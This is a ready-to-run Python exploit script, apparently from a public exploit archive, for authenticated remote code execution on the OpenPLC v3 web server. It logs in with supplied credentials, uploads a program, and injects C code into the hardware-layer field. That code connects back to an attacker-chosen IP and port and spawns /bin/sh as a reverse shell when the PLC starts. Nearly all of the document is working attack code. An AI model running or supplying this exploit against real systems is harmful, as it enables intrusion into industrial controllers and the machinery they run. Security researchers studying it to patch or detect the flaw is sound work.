# Exploit Title: OpenPLC 3 - Remote Code Execution (Authenticated)
# Date: 25/04/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.openplcproject.com/
# Software Link: https://github.com/thiagoralves/OpenPLC_v3
# Version: OpenPLC v3
# Tested on: Ubuntu 16.04,Debian 9,Debian 10 Buster

#/usr/bin/python3

import requests
import sys
import time
import optparse
import re

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://target-uri:8080)")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Pass credential to login")
parser.add_option('-i', '--rip', action="store", dest="rip", help="IP for Reverse Connection")
parser.add_option('-r', '--rport', action="store", dest="rport", help="Port for Reverse Connection")

options, args = parser.parse_args()
if not options.url:
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    print('[+] Specify an url target')
    print("[+] Example usage: exploit.py -u http://target-uri:8080 -l admin -p admin -i 192.168.1.54 -r 4444")
    exit()

host = options.url
login = options.url + '/login'
upload_program = options.url + '/programs'
compile_program = options.url + '/compile-program?file=681871.st'
run_plc_server = options.url + '/start_plc'
user = options.user
password = options.passw
rev_ip = options.rip
rev_port = options.rport
x = requests.Session()

def auth():
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    time.sleep(1)
    print('[+] Checking if host '+host+' is Up...')
    host_up = x.get(host)
    try:
        if host_up.status_code == 200:
            print('[+] Host Up! ...')
    except:
        print('[+] This host seems to be down :( ')
        sys.exit(0)

    print('[+] Trying to authenticate with credentials '+user+':'+password+'')
    time.sleep(1)
    submit = {
        'username': user,
        'password': password
    }
    x.post(login, data=submit)
    response = x.get(upload_program)

    if len(response.text) > 30000 and response.status_code == 200:
        print('[+] Login success!')
        time.sleep(1)
    else:
        print('[x] Login failed :(')
        sys.exit(0)

def injection():
    print('[+] PLC program uploading... ')
    upload_url = host + "/upload-program"
    upload_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvgPw.qwEcF3rMliGcTgQ4zI4RInBZrqE"}
    upload_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------210749863411176965311768214500", "Origin": host, "Connection": "close", "Referer": host + "/programs", "Upgrade-Insecure-Requests": "1"}
    upload_data = "-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"file\"; filename=\"program.st\"\r\nContent-Type: application/vnd.sailingtracker.track\r\n\r\nPROGRAM prog0\n  VAR\n    var_in : BOOL;\n    var_out : BOOL;\n  END_VAR\n\n  var_out := var_in;\nEND_PROGRAM\n\n\nCONFIGURATION Config0\n\n  RESOURCE Res0 ON PLC\n    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);\n    PROGRAM Inst0 WITH Main : prog0;\n  END_RESOURCE\nEND_CONFIGURATION\n\r\n-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Program\r\n-----------------------------210749863411176965311768214500--\r\n"
    upload = x.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)

    act_url = host + "/upload-program-action"
    act_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------374516738927889180582770224000", "Origin": host, "Connection": "close", "Referer": host + "/upload-program", "Upgrade-Insecure-Requests": "1"}
    act_data = "-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_name\"\r\n\r\nprogram.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_descr\"\r\n\r\n\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_file\"\r\n\r\n681871.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"epoch_time\"\r\n\r\n1617682656\r\n-----------------------------374516738927889180582770224000--\r\n"
    upload_act = x.post(act_url, headers=act_headers, data=act_data)
    time.sleep(2)

def connection():
    print('[+] Attempt to Code injection...')
    inject_url = host + "/hardware"
    inject_dash = host + "/dashboard"
    inject_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvyFA.2NQ7ZYcNZ74ci2miLkefHCai2Fk"}
    inject_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------289530314119386812901408558722", "Origin": host, "Connection": "close", "Referer": host + "/hardware", "Upgrade-Insecure-Requests": "1"}
    inject_data = "-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"hardware_layer\"\r\n\r\nblank_linux\r\n-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"custom_layer_code\"\r\n\r\n#include \"ladder.h\"\r\n#include <stdio.h>\r\n#include <sys/socket.h>\r\n#include <sys/types.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nint ignored_bool_inputs[] = {-1};\r\nint ignored_bool_outputs[] = {-1};\r\nint ignored_int_inputs[] = {-1};\r\nint ignored_int_outputs[] = {-1};\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nvoid initCustomLayer()\r\n{\r\n   \r\n    \r\n    \r\n}\r\n\r\n\r\nvoid updateCustomIn()\r\n{\r\n\r\n}\r\n\r\n\r\nvoid updateCustomOut()\r\n{\r\n    int port = "+rev_port+";\r\n    struct sockaddr_in revsockaddr;\r\n\r\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\r\n    revsockaddr.sin_family = AF_INET;       \r\n    revsockaddr.sin_port = htons(port);\r\n    revsockaddr.sin_addr.s_addr = inet_addr(\""+rev_ip+"\");\r\n\r\n    connect(sockt, (struct sockaddr *) &revsockaddr, \r\n    sizeof(revsockaddr));\r\n    dup2(sockt, 0);\r\n    dup2(sockt, 1);\r\n    dup2(sockt, 2);\r\n\r\n    char * const argv[] = {\"/bin/sh\", NULL};\r\n    execve(\"/bin/sh\", argv, NULL);\r\n\r\n    return 0;  \r\n    \r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n-----------------------------289530314119386812901408558722--\r\n"
    inject = x.post(inject_url, headers=inject_headers, cookies=inject_cookies, data=inject_data)
    time.sleep(3)
    comp = x.get(compile_program)
    time.sleep(6)
    x.get(inject_dash)
    time.sleep(3)
    print('[+] Spawning Reverse Shell...')
    start = x.get(run_plc_server)
    time.sleep(1)
    if start.status_code == 200:
        print('[+] Reverse connection receveid!')
        sys.exit(0)
    else:
        print('[+] Failed to receive connection :(')
        sys.exit(0)

auth()
injection()
connection()